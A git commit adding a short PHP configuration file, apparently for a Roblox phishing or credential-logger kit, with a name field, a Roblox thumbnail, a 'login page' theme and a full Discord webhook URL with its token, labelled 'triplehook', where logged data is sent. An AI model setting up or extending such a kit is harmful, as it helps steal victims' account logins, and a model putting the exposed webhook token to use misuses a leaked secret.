9eb0123844fdef0d15dfc268e73099975ce19181
Dallorin <157832529+Dallorin@users.noreply.github.com>
2024-03-17 15:53:02 +0300

    Add files via upload

---
+++ setup.php
@@ -0,0 +1,11 @@
+<?php
+$name = 'TermedRaaaa'; // Change to ur own name
+$thumbnail = 'https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91'; // discord webhook thumbnail & logger thumbnail
+$hex = '#00000'; // color shit
+$triplehook = 'https://discord.com/api/webhooks/1218894224997617785/GomvjhV4MujPp5XGs8aEn0dmw27C-M31u37hqTWlOKD5NAdZF2bC2quED6V5AyWud6T-'; // input ur fucking triplehook webhook here 
+$loginColor = [
+    "theme" => "white", // change be changed to white to for white login page
+];
+?>
+
+
